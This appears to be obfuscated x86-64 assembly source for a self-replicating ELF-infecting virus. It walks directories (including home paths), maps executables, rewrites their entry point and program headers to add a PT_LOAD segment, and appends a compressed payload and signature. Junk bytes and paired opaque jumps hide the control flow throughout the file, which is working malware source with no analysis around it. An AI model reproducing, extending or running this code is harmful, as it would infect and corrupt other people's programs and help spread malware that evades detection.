    jne         ..@5Xxh6Tlgi9LX
    jmp         $+3
db 0xe0
    jl          ..@k9T5NOCkPXrC
    jge         ..@k9T5NOCkPXrC
..@I7iHgIXqXGmo:
    xor         rdx, rdx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    jl          ..@c15beUsubYBF
    jge         ..@c15beUsubYBF
..@wAMkOLKQilw4:
    call        MapFile
    js          ..@pRuCC8QbneUs
    jns         ..@pRuCC8QbneUs
..@K5vGHDI1fL2f:
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+4
db 0x63, 0xb5
    jmp         ..@Q5YkDydcwA4M
..@PyEoMv10Zn0q:
    rep movsb 
    jb          ..@FBKWjRb6Qqsm
    jae         ..@FBKWjRb6Qqsm
..@ZBAxqXiSk8Vs:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+5
db 0x6c, 0x34, 0xe0
    jmp         ..@8tm2tgPSpYNf
..@cYrHtq0NjT1C:
    ret
    jmp         $+3
db 0x73
    jmp         ..@rZ7qNVQsHsgv
..@4rSSipskJqEz:
    mul         r2
    js          ..@3hS0pnVkBRJH
    jns         ..@3hS0pnVkBRJH
..@YdLfCP3OLxvi:
    xor         rcx, rcx
    mov         ecx, WINDOW_LENGTH
    jl          ..@yqyjeOpCzBp9
    jge         ..@yqyjeOpCzBp9
DYNPIEValidation:
    jmp         ..@VIl87moDF44G
..@X1ECtKy8btt0:
    call        UnmapFile
    mov         r2, 11b
    je          ..@jSqBCZSrL9NA
    jne         ..@jSqBCZSrL9NA
..@cS6c66HTlUaz:
    add         rsp, _INFFILE_OFF_size
    jmp         $+3
db 0xa8
    je          ..@ahbwglLJDRtH
    jne         ..@ahbwglLJDRtH
..@nPFo2IJ5tWSF:
    mov         DWORD [r2], PT_LOAD
    mov         QWORD [r1+e_h.e_entry], r3
    jmp         $+3
db 0x23
    jmp         $+3
db 0xf4
    js          ..@vNTHFHVJc4Ve
    jns         ..@vNTHFHVJc4Ve
..@j4jjioevyQYN:
    je          ..@FBKWjRb6Qqsm
    cmp         rdi, rsi
    js          ..@KBiH3UqDtA00
    jns         ..@KBiH3UqDtA00
..@5SlIFDCBMoj5:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jmp         ..@AAeU2EO7h7Nu
..@Fb84znZ8Jlae:
    jmp         ..@RSUiE4NS5Pmy
    jl          ..@E12MtQHXIwJa
    jge         ..@E12MtQHXIwJa
..@4tvjyHdGrguD:
    xor         rax, rax
    jmp         ..@VdcDE8Ukjlle
..@q7JKIfd3IsNi:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+3
db 0xd7
    jmp         $+5
db 0xa5, 0xc7, 0xb3
    jl          ..@HTxpQXfBEGGO
    jge         ..@HTxpQXfBEGGO
..@LZ5jIelEW7yJ:
    mov         r1, r4
    jmp         $+4
db 0x79, 0x90
    jb          ..@cTeLFbPfQDzc
    jae         ..@cTeLFbPfQDzc
..@lvxuocqR1LKG:
    mov         DWORD [r5+file.filefd], 0x00
    js          ..@OGPspkwQyrEx
    jns         ..@OGPspkwQyrEx
..@r0jEBtDpSJ32:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jl          ..@MGXT1k5tio5r
    jge         ..@MGXT1k5tio5r
..@L9toH1S8GioC:
    mov         r2, r1
    add         r2, e_h.e_shoff
    jmp         ..@0P4QRNrdhrYo
..@q11p1b4bNtPS:
    mov         r5, QWORD [r1+file.fileptr]
    jb          ..@4V0WiCVSx7LX
    jae         ..@4V0WiCVSx7LX
..@SjAA1cjKRDba:
    add         rax, r2
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+4
db 0xf0, 0x7c
    jl          ..@S2ZAvlHIT5v4
    jge         ..@S2ZAvlHIT5v4
..@bnQl9mVciHRN:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    js          ..@7jv4z9bVaHAy
    jns         ..@7jv4z9bVaHAy
..@PcSPjRb5do1i:
    sub         rbx, r3
    add         rax, rbx
    jl          ..@6SFt36CqftJu
    jge         ..@6SFt36CqftJu
..@saqRpqu3zdQG:
    jne         ..@Grjy3p8I7hHH
    jmp         $+3
db 0x01
    jmp         ..@I7iHgIXqXGmo
..@hyhNiw44qDza:
    jmp         ..@oz0w6dKg0d2f
    jmp         $+3
db 0x42
    jmp         $+5
db 0xb2, 0x7b, 0xd6
    je          ..@4PTYO4XqPlDG
    jne         ..@4PTYO4XqPlDG
..@Fgiw9j80GDpd:
    cmp         DWORD [r1+1], "home"
    js          ..@iFVy59tt1XUp
    jns         ..@iFVy59tt1XUp
..@k9T5NOCkPXrC:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jge         ..@cGP4eVS9c0f1
    jb          ..@B8ejZoBIydNL
    jae         ..@B8ejZoBIydNL
..@uIQSLyUme2Zn:
    mov         m6, rax
    jmp         $+4
db 0xde, 0x8f
    jb          ..@PyTJLkqbD9Kf
    jae         ..@PyTJLkqbD9Kf
..@UY6ONonz96eO:
    jmp         ..@pXOpto1Nenc7
    je          ..@cPJMfmdalc2W
    jne         ..@cPJMfmdalc2W
..@1vYdz2IxqmUj:
    call        AddSizeMappedFile
    jl          ..@VBOd5pmHZyKq
    jge         ..@VBOd5pmHZyKq
..@SC5NgB7EcbW3:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    xor         r2, r2
    jmp         $+4
db 0xfa, 0x9d
    jmp         $+5
db 0x5a, 0xe5, 0x5b
    jb          ..@aGQgpSjJ10zS
    jae         ..@aGQgpSjJ10zS
..@fEZYZfYiXlPL:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+4
db 0xfb, 0x42
    jb          ..@eLJhHXkukITJ
    jae         ..@eLJhHXkukITJ
..@IeWHdtvy0mkF:
    xor         rax, rax
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jmp         $+4
db 0x2f, 0x7a
    jmp         $+4
db 0x47, 0x4a
    jmp         $+3
db 0x95
    jmp         $+4
db 0xf3, 0xfd
    jmp         ..@c6cHv83DmXSN
..@ZI0VvMoussGt:
    cmp         WORD [r1], '..'
    jmp         $+5
db 0x51, 0x1e, 0xcc
    jb          ..@ooCeATET1k6E
    jae         ..@ooCeATET1k6E
..@ebFiM4AFQUuw:
    call        DYNPIEValidation
    jmp         $+4
db 0x8f, 0xe8
    jmp         ..@lDPCQjI2IXkd
NonBinaryFile:
    jmp         ..@NOnmaeYF4hkj
..@qdV1CVbXHecl:
    ret
    jmp         $+4
db 0x42, 0xa5
    js          CreatePayload
    jns         CreatePayload
..@A8VTU1oIglQd:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jmp         $+4
db 0x12, 0x5c
    jmp         $+4
db 0x77, 0x23
    jmp         $+5
db 0xef, 0xd0, 0x7c
    jmp         $+4
db 0x9b, 0x10
    jmp         $+3
db 0xa8
    jmp         ..@tHjjQxPTE62q
..@YlYAIacUZF2V:
    xor         rax, rax
    xor         rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         $+5
db 0xc1, 0x48, 0xe6
    jmp         $+4
db 0x78, 0x35
    jmp         ..@AGjxJJlq5J0N
..@FBKWjRb6Qqsm:
    pop         r5
    jmp         ..@R0B4ee3rnLLU
..@xRvy4WEkC6ZF:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         ..@IriRmcrWM58o
..@b0M8V4CQhfqO:
    add         rcx, 2*bytes
    jmp         $+5
db 0xb7, 0x60, 0x7c
    jmp         $+3
db 0x9c
    jmp         ..@wclrNHCxHZ5n
..@gcIgl41igXcn:
    ret
..@eLJhHXkukITJ:
    jge         ..@oz0w6dKg0d2f
    jmp         ..@xzzSlNn6IaZj
..@PcRi3GUg7dO2:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+4
db 0xa3, 0xa8
    jmp         $+3
db 0x7f
    jb          ..@8OqqD9iVOi9f
    jae         ..@8OqqD9iVOi9f
..@LeSl1KImZMnY:
    mov         DWORD [r5+file.filefd], eax
    xor         r1, r1
    jmp         $+5
db 0x9e, 0x9b, 0x19
    jmp         $+5
db 0x08, 0x11, 0x91
    jmp         $+5
db 0xb2, 0x84, 0x56
    jmp         $+3
db 0x13
    jl          ..@Iht8Y88RV8O2
    jge         ..@Iht8Y88RV8O2
..@6MaP5NLZJnsu:
    mov         r5, r2
    jmp         $+3
db 0x19
    js          ..@NwxvB1837AfX
    jns         ..@NwxvB1837AfX
..@fKHPCDyP6f2n:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+4
db 0xdb, 0x2f
    jmp         $+5
db 0x83, 0xf1, 0x6b
    jmp         ..@LHlBKxt0HAPR
..@jfJUAMCAZAwp:
    je          ..@4PTYO4XqPlDG
    je          ..@RbCupw3Su7TY
    jne         ..@RbCupw3Su7TY
..@Hx1DdU4nrv4F:
    push        r1
    sub         rsp, _VADDR_OFF_size
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         $+3
db 0x8b
    jmp         ..@rN09HOLWLKkx
..@EYKfcEkgsGn4:
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@hxfqGTzCxVYd
..@q9eb5rf39ywp:
    add         rdi, 0x4
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    mov         QWORD [rdi], rsi
    jmp         $+5
db 0xf1, 0xf2, 0xb5
    jmp         $+4
db 0x9a, 0x7e
    jmp         $+4
db 0xba, 0x72
    jmp         ..@p7ScmdMeeNVW
..@EL2u7S8kz1Ne:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+3
db 0x77
    jmp         $+3
db 0x70
    jmp         ..@L9toH1S8GioC
..@2ohtfSct515l:
    rep         movsb
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         ..@nJOLs7KRiFEA
..@hgE5w6Fo7uHx:
    pop         r5
    jmp         $+4
db 0xa8, 0x11
    jmp         ..@J9s4u9Tbngej
..@9vHlxQj499aM:
    mov         rax, (-1)
    jmp         $+3
db 0x40
    jmp         $+5
db 0x62, 0xe4, 0x12
    js          ..@611tBUgINy3K
    jns         ..@611tBUgINy3K
..@VaG5oao5Ygbw:
    jmp         ..@88KHKzk7iMJP
    jl          ..@TP3zax1Pdf2L
    jge         ..@TP3zax1Pdf2L
..@HH4BDrotzimV:
    cmp         r1, 0x00
    jmp         ..@UsYOkrwrPnRL
..@BOtHOiiC7u0U:
    ret
    js          GetNewProgramVaddr
    jns         GetNewProgramVaddr
..@mRjmRZHpQhPm:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jl          ..@eCQ38dTL726y
    jge         ..@eCQ38dTL726y
..@zlP8TzrwGrMm:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    je          ..@t75i7PmDsrll
    jne         ..@t75i7PmDsrll
..@3FtceDVcgj4W:
    mov         rax, SYS_FORK
    js          ..@NbtSBmqxXclB
    jns         ..@NbtSBmqxXclB
..@MGXT1k5tio5r:
    add         rsp, _INFDIR_OFF_size
    jmp         $+5
db 0x28, 0x85, 0xe7
    jb          ..@NX9BOq6k6dD6
    jae         ..@NX9BOq6k6dD6
..@8OuO0U9gKJAi:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    js          ..@7jK9ru52YNGT
    jns         ..@7jK9ru52YNGT
..@xdYv9PZaR2UT:
    add         r1, 1
    add         r2, 1
    jb          ..@SthyxNdQc1hl
    jae         ..@SthyxNdQc1hl
..@fuN7j2mTKt4h:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jl          ..@Grjy3p8I7hHH
    jge         ..@Grjy3p8I7hHH
..@PoqDx0pqFdd3:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    xor         r4, r4
    jmp         $+5
db 0x6e, 0xd4, 0xf6
    jmp         $+4
db 0x8b, 0x17
    jl          ..@dPD0BooPh80v
    jge         ..@dPD0BooPh80v
..@My679AkxlRTY:
    VAR         packed, pwd_var
    je          ..@Pu5aY6fv4l0C
    jne         ..@Pu5aY6fv4l0C
..@vq7wrNrSDKxp:
    call_vsp    Strlen
    jmp         ..@BjS5sCIfxMKQ
..@3rBVjVMcORPp:
%ifdef X86_32
    mov         esi, 0x01
%endif
    jmp         $+3
db 0x69
    js          ..@2FeOVF5N35MH
    jns         ..@2FeOVF5N35MH
..@ZwdwaYIz0mfE:
    pop         r5
    jmp         $+5
db 0x67, 0x53, 0xec
    jmp         $+3
db 0x61
    js          ..@o0erQOqCPIGN
    jns         ..@o0erQOqCPIGN
..@KaLksZ5wSH74:
    cmp         r3, 0x00
    jmp         $+5
db 0x1d, 0xf8, 0xf1
    je          ..@v5DUdKckfirm
    jne         ..@v5DUdKckfirm
..@Jz7QhAQWXp17:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+3
db 0xed
    jl          ..@QgGokKcGlq3I
    jge         ..@QgGokKcGlq3I
Strcpy:
    jmp         ..@B5eU9RZlntJj
..@xLM2yX8Ho5Kt:
    mov         r2, 1b
    call        MapFile
    cmp         rax, 0
    jmp         $+5
db 0x48, 0x8b, 0xd9
    jmp         ..@7BbPjQEwPe47
..@o0erQOqCPIGN:
    ret
    jmp         MemMove
..@xgrqprr9QNjF:
    sub         rdi, 1
    sub         rsi, 1
    std
    jmp         ..@gdm0H23kuy9C
..@JSC2ybeWasgU:
    cmp         rax, 0
    jmp         ..@BeckXTiHvYQ6
..@SxuJviyzmB6d:
    mov         rax, SYS_GETUID
    syscall
    jb          ..@pbjYpIfgL2ih
    jae         ..@pbjYpIfgL2ih
..@uOC73yUAKMYL:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
    mov         edx, 11b
    mov         esi, 0x22
%endif
    jmp         ..@qhz8z9q6qBDh
..@pfnPahA61d3X:
    mov         QWORD [r2+p_h.p_vaddr], r3
    jmp         $+5
db 0xeb, 0xd8, 0x30
    js          ..@4bFPNOvGMuoE
    jns         ..@4bFPNOvGMuoE
..@cBTcczWrZjgu:
    mov         QWORD [r2+p_h.p_offset], r3
    jmp         ..@afH8Ql8R9yLw
..@xcJAVtwS8bU8:
    VAR         packed, dirs_root
    jmp         ..@FvpNHFZl78ra
    jmp         ..@TrY8TMOOygZR
..@UsYOkrwrPnRL:
    jg          ..@rZ7qNVQsHsgv
    jmp         $+3
db 0x1a
    jl          ..@dtIZtBn8QrJe
    jge         ..@dtIZtBn8QrJe
..@Fodomj5itPSF:
    jne         ..@cS6c66HTlUaz
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+3
db 0xd6
    jb          ..@ikgPTaTG2OSC
    jae         ..@ikgPTaTG2OSC
..@aoon4D8YUFEz:
    push        r2
    jb          ..@mkescq5Qdjvs
    jae         ..@mkescq5Qdjvs
..@Eix5o9R89Rf4:
    jnz         ..@Y3sATuHXbRQx
    jmp         $+4
db 0x24, 0x3a
    jmp         ..@ixf5WGuQeQ27
..@AulT9fKsgL1j:
    mov         r1, r5
    call        IsELFComplete
    test        al, al
    jmp         ..@UsVfVNYvzoOb
..@KBiH3UqDtA00:
    jbe         ..@PyEoMv10Zn0q
    jl          ..@KbYcrJwYLgG3
    jge         ..@KbYcrJwYLgG3
..@ckEHMrJvejhn:
    mov         ecx, signature_len
    jmp         $+4
db 0x57, 0x59
    jmp         $+3
db 0xf6
    jmp         $+3
db 0x88
    jmp         $+5
db 0x8d, 0x53, 0x4d
    je          ..@UCOARpXYYQaV
    jne         ..@UCOARpXYYQaV
..@3Osun3h9m88i:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    js          ..@cBTcczWrZjgu
    jns         ..@cBTcczWrZjgu
..@2rWPr1Nv0NoB:
    ret
    jmp         $+3
db 0x3d
    jmp         $+4
db 0x04, 0xb3
    jb          AddSizeMappedFile
    jae         AddSizeMappedFile
..@9UHmOqYzVIsN:
    test        rax, rax
    js          ..@sLwgKSYSsHZn
    jns         ..@sLwgKSYSsHZn
..@g4prVM2GFzA4:
    mov         QWORD [r5+file.fileptr], 0x00
    jb          ..@ZzVbKnpg1EWo
    jae         ..@ZzVbKnpg1EWo
..@qKg4vdRgo52V:
    sub         r2, 1
    cmp         r2, 0
    jmp         $+5
db 0x4e, 0xa6, 0xbe
    jmp         ..@XaU1CGE0as4V
..@8Pl9xDwNEDHe:
    call_vsp    Strncmp
    js          ..@9UHmOqYzVIsN
    jns         ..@9UHmOqYzVIsN
..@LHlBKxt0HAPR:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jnz         ..@deLH2ZVwwuI3
    jmp         ..@NLoRyrDfFi5i
GetNewProgramVaddr:
    jmp         ..@Hx1DdU4nrv4F
..@RZXLyxaffE48:
    xor         r4, r4
    jmp         ..@pXOpto1Nenc7

_eof: